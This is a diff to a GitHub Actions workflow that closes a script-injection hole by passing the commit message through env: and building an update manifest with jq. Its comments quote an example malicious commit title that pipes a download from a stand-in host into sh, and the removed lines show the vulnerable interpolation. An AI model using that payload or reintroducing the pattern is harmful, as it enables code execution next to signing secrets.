@@ -124,9 +124,16 @@ jobs:
       # A commit message containing [force-update] makes the new APK required.
       # Before, EVERY push set mandatory: true, so users were blocked by a
       # full APK download on every single release.
+      # COMMIT_MESSAGE goes through `env:` rather than being expanded straight
+      # into the script. A `${{ }}` expression is pasted in as literal text
+      # before bash sees the line, so a commit titled `x"; curl evil.sh | sh; #`
+      # used to run in this job — the one holding the Android signing keystore
+      # and the Firebase service account. Through env: it is only ever a value.
       - name: Decide if this native build is mandatory
+        env:
+          COMMIT_MESSAGE: ${{ github.event.head_commit.message }}
         run: |
-          if echo "${{ github.event.head_commit.message }}" | grep -qi '\[force-update\]'; then
+          if printf '%s' "$COMMIT_MESSAGE" | grep -qi '\[force-update\]'; then
             echo "IS_MANDATORY=true" >> $GITHUB_ENV
           else
             echo "IS_MANDATORY=false" >> $GITHUB_ENV
@@ -137,6 +144,8 @@ jobs:
 
       # --- STEP 1: CREATE THE OTA BUNDLE FOR NATIVE ---
       - name: Create Web Update Manifests
+        env:
+          COMMIT_MESSAGE: ${{ github.event.head_commit.message }}
         run: |
           FIREBASE_URL="https://imnci-courses-monitor.web.app"
           ZIP_NAME="update-${{ env.BUILD_VERSION }}.zip"
@@ -152,16 +161,20 @@ jobs:
           CHECKSUM=$(sha256sum ${ZIP_NAME} | cut -d ' ' -f1)
           mkdir -p dist/latest
           mv ${ZIP_NAME} dist/latest/
-          cat <<EOF > dist/latest/update.json
-          {
-            "version": "${{ env.BUILD_VERSION }}",
-            "url": "${FIREBASE_URL}/latest/${ZIP_NAME}",
-            "checksum": "${CHECKSUM}",
-            "mandatory": false,
-            "notes": "${{ github.event.head_commit.message }}",
-            "minNativeBuild": 1
-          }
-          EOF
+          # Built with jq rather than a heredoc. The old version interpolated the
+          # commit message into an unquoted <<EOF, which runs command
+          # substitution — a commit titled `x$(...)` executed here, next to the
+          # signing keystore. It also produced invalid JSON the moment a commit
+          # message contained a double quote, which would have left every device
+          # unable to parse the manifest.
+          jq -n \
+            --arg version "$BUILD_VERSION" \
+            --arg url "${FIREBASE_URL}/latest/${ZIP_NAME}" \
+            --arg checksum "$CHECKSUM" \
+            --arg notes "$COMMIT_MESSAGE" \
+            '{version: $version, url: $url, checksum: $checksum,
+              mandatory: false, notes: $notes, minNativeBuild: 1}' \
+            > dist/latest/update.json
           cat dist/latest/update.json
 
       # --- STEP 2: BUILD AND SIGN THE APK ---
